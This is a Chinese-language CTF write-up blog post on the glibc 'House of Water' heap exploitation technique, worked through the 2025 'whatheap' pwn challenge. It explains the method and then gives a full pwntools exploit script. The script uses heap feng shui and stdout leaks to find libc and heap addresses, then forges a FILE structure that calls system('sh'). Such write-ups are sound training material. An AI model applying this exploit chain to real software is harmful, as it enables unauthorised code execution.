---
date: 2025-11-11 10:21:59
layout: post
title: 浅浅打一个 House of Water
subtitle: 以研究生国赛（华为杯）2025 Whatheap 一题为例 
description: >-
    long time no pwn ~
image: >-
  /assets/img/uploads/starrail_pond.jpg
optimized_image: >-
  /assets/img/uploads/starrail_pond.jpg
category: ctf
tags:
  - house of water
  - IO_2_1_stdout leak
author: rosayxy
paginate: true
---

下周就是 BlackHat MEA Final 了，而我从 XCTF Final 到现在的这个月科研任务有点重，（是谁说调研新工作会相对轻松的来着，哥们编故事想 idea 看论文快似了），就没怎么花时间在 ctf 上，所以这周末就先复健一波，填一下之前 House of Water 的坑。

主要参考的板子为 [UDP 的 writeup](https://github.com/UDPctf/CTF-challenges/tree/main/Potluck-CTF-2023/Tamagoyaki)，唉，好久没和 UDP 打题了，想一起打

主要参考的博客为这篇 [leakless heap](https://corgi.rip/posts/leakless_heap_1/)，花了大概一个下午复现出来，感觉并不太难（主要不用自己想堆风水，照抄 UDP 的整法就行）

## 题目
给了 UAF，没有 edit 机会，没有 leak，会给 IO_2_1_stdout 的低第4个 hex digit，相当于能知道 libc 地址的最低 2 字节，malloc 的话，可以指定

在当时比赛的时候，我对 house of water 只知道 how2heap 上的版本，也就是控制 tcache metadata，然后 fake metadata 上的指针来做 arbitrary alloc，但是并不能很好的和当时的条件对应起来（how2heap 上说的 house of water 的利用条件是 UAF， 造成的原语是 tcache metadata control 和 "a libc pointer can also be inserted into the metadata"），但是现在看起来，感觉有些条件就是很明显的 house of water 的 feature，比如 malloc 的时候可以从中间写，leakless，给了 libc 低2字节等

然后当时主要是想 unsorted bin attack（因为没有像 UDP 这样想到纯用堆风水控制 tcache metadata 呜呜），利用 “malloc 的时候可以从申请的堆快中间写” 的方法去 overwrite bk_nextsize，但是感觉造成的原语太弱了（任意地址写堆地址），就不知道怎么做了，赛后和组里的师傅聊起来才发现 house of water 的完整做法，感觉是一个很强的原语并且同样支持 leakless heap

## 复现

首先，参考 UDP 的 writeup，我们在 house of water 里面主要是什么思路呢？整体的思路是利用 tcache metadata 的结构本身去伪造一个 unsorted bin 的堆块最开头，然后在更高地址的堆空间伪造其 footer，从而可以 fake 一个 unsorted bin 堆块，但是我们怎么让 libc 认为这个我们伪造的堆块是实际存在的呢？这就需要通过堆风水，伪造两个 unsorted bin chunk，改造他们的 fd 和 bk 指针指向我们的 fake 堆块，并且使得我们 fake 堆块的 fd 和 bk 指向他们，整体构成一个合法的双向链表


```c
typedef struct tcache_perthread_struct
{
  uint16_t counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```

之后就可以从我们伪造的 unsorted bin chunk 里面去申请堆块来控制 tcache metadata 了，此外，我们使得链表中另两个 unsorted bin chunk 都比我们申请的大小小，所以他们会被扔到 smallbin 里面，从而在我们的伪造的 unsorted bin chunk 写下 libc 相对偏移地址，并且因为是在 tcache metadata 中，所以这些 libc 相对偏移地址会被认为是被 free 的 tcache chunk 地址

我们 partial overwrite 这些 libc 相对偏移地址到 IO_2_1_stdout 来做 leak，拿到 libc 基地址之后再来一遍 IO_2_1_stdout leak 泄露堆地址，具体做法和 [这个博客](https://blog.rosay.xyz/codegate-quals-2025-writeup/) 是同款

然后任意地址写 IO_list_all 打 house of water

## exp

```py

from pwn import *
context(os='linux',log_level='debug')

p = process("./whatheap")
libc = ELF("./libc.so.6")

# is_play 不为 0 时
def create(size, data, offset, is_play):
    p.recvuntil("Your choice >> \n")
    p.sendline("1")
    p.recvuntil("Input the size of your chunk: ")
    p.sendline(str(size))
    p.recvuntil("do you want to play a game ?(1/0)")
    p.sendline(str(is_play))
    if is_play:
        p.recvuntil("you can set a offset!\n")
        p.sendline(str(offset))
    p.recvuntil("Input: ")
    p.send(data)


def create_no_play(size, data):
    p.recvuntil("Your choice >> ")
    p.sendline("1")
    p.recvuntil("Input the size of your chunk: ")
    p.sendline(str(size))
    p.recvuntil("Input: ")
    p.send(data)


def delete(index):
    p.recvuntil("Your choice >> \n")
    p.sendline("2")
    p.recvuntil("idx: ")
    p.sendline(str(index))


# get gift
p.recvuntil("Your choice >> \n")
p.sendline("4")
p.recvuntil("gift: ")
gift = int(p.recvline().strip())
log.success("gift: " + hex(gift))

# 0-6
for i in range(7):
    create(0x88, "0x88\n", 0, 0)

# 7-13
for i in range(7):
    create(0x1a8, "0x1a8\n", 0, 0)
create(0x3d8, "0x3d8\n", 0, 0) # 14
create(0x3e8, "0x3e8\n", 0, 0) # 15
delete(14)
delete(15)
create(0x18, "guard1\n", 0, 0) # 16
create(0x88, "a1\n", 0, 0) # 17
create(0x88, "b1\n", 0, 0) # 18
create(0x88, "c1\n", 0, 0) # 19
create(0x88, "d1\n", 0, 0) # 20

create(0x18, "guard2\n", 0, 0) # 21
create(0x88, "a2\n", 0, 0) # 22
create(0x88, "b2\n", 0, 0) # 23
create(0x88, "c2\n", 0, 0) # 24
create(0x88, "d2\n", 0, 0) # 25

create(0x18, "guard3\n", 0, 0) # 26

for i in range(7):
    delete(i)

delete(17)
delete(18)
delete(19)

delete(22)
delete(23)
delete(24)

create(0x1a8, b'2'*0x118 + p64(0x31) + b"\n", 0, 0) # 27
create(0x1a8, b'1'*0x118 + p64(0x21) + b"\n", 0, 0) # 28

delete(19)
delete(24)

delete(27)
delete(28)

create(0x1a8, b"a"*0x88 + p64(0xe1) + b"\n", 0, 0) # 29
create(0x1a8, b"b"*0x88 + p64(0xf1) + b"\n", 0, 0) # 30

for i in range(7):
    delete(i + 7)

delete(18) # which is now size 0xe1
delete(23) # which is now size 0xf1

delete(29)
delete(20)


create(0x38, b"x\n", 0, 0) # 31
create(0x48, b"x\n", 0, 0) # 32
create(0x38, b"x\n", 0, 0) # 33
create(0x58, b"x\n", 0, 0) # 34

create(0x108, b"y"*0x88 + b"\n", 0, 0) # 35, unsorted f1

delete(30)
delete(25)

create(0x38, b"x\n", 0, 0) # 36
create(0x48, b"x\n", 0, 0) # 37
create(0x38, b"x\n", 0, 0) # 38
create(0x58, b"x\n", 0, 0) # 39
create(0x108, b"y"*0x88 + b"\n", 0, 0) # 40, unsorted f2

create(0x108, b"z"*0x88 + b"\n", 0, 0) # 41 , this will be hijacked, unsorted f3

# do the job

for i in range(7):
    create(0x108, b"a"*0x88 + b"\n", 0, 0) # 42 - 48


for i in range(7):
    delete(42 + i)

for i in range(36): # 49 - 84
    create(0x5f8, b'Z'*0x5f0 + b"\n", 0, 0)
create(0x5f8, b'A'*0xf0+p64(0x10000)+p64(0x20) + b"\n", 0, 0) # 85

delete(35)

delete(41)
delete(40)

# leverage
create(0xd8, p16(0x6080)+b"\n", 0xa8, 1) # 86
create(0xe8, p16(0x6080)+b"\n", 0xa0, 1) # 87
create(0x248, p16(0x6010) + b"\n", 0x1e0, 1) # 88


create_no_play(0x3d8, p64(0x10001) + p64(0)*0x10 + p16(gift + 0x5c0)+b"\n") #  89
create_no_play(0x28, p64(0xfbad1800) + p64(0)*3 + b"\x00\n") # 90

p.recv(0x28)
libc_leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("libc_leak: " + hex(libc_leak))
libc_base = libc_leak - 0x2038e0
log.info("libc_base: " + hex(libc_base))
# heap leak

p.sendline("2")
p.recvuntil("idx: ")
p.sendline("89")
create_no_play(0x288, p64(0x100010001) + p64(0)*0x11 + p64(libc_base + 0x2045c0) + b"\n") # 91
create_no_play(0x38, p64(0xfbad1800) + p64(0)*3 + p64(libc_base + 0x203b20) + p64(libc_base + 0x203b20 + 0x20) + p64(libc_base + 0x203b20 + 0x20)) # 92
heap_leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("heap_leak: " + hex(heap_leak))
heap_base = heap_leak - 0x580 - 0x10000
log.info("heap_base: " + hex(heap_base))

# do house of apple2

io_list_all = libc_base + libc.symbols['_IO_list_all']
system_addr = libc_base + libc.symbols['system']
fake_io_addr = heap_base + 0x2e0

fake_io_file=b"  sh;".ljust(0x8,b"\x00") 
fake_io_file+=p64(0)*3+p64(1)+p64(2)
fake_io_file=fake_io_file.ljust(0x30,b"\x00")
fake_io_file+=p64(0)
fake_io_file=fake_io_file.ljust(0x68,b"\x00")
fake_io_file+=p64(system_addr)
fake_io_file=fake_io_file.ljust(0x88,b"\x00")
fake_io_file+=p64(libc_base+0x205710)
fake_io_file=fake_io_file.ljust(0xa0,b"\x00")
fake_io_file+=p64(fake_io_addr)
fake_io_file=fake_io_file.ljust(0xd8,b"\x00")
fake_io_file+=p64(0x202228+libc_base) # 使得可以调用 _IO_wfile_overflow
fake_io_file+=p64(fake_io_addr)

create_no_play(0x600, fake_io_file + b"\n") # 93

p.sendline("2")
p.recvuntil("idx: ")
p.sendline("89")

create_no_play(0x288, p64(0x100010001) + p64(0)*0x11 + p64(io_list_all) + b"\n")
create_no_play(0x38,p64(fake_io_addr) + b"\n")

p.recvuntil("Your choice >> ")
p.sendline("5")
p.interactive()
```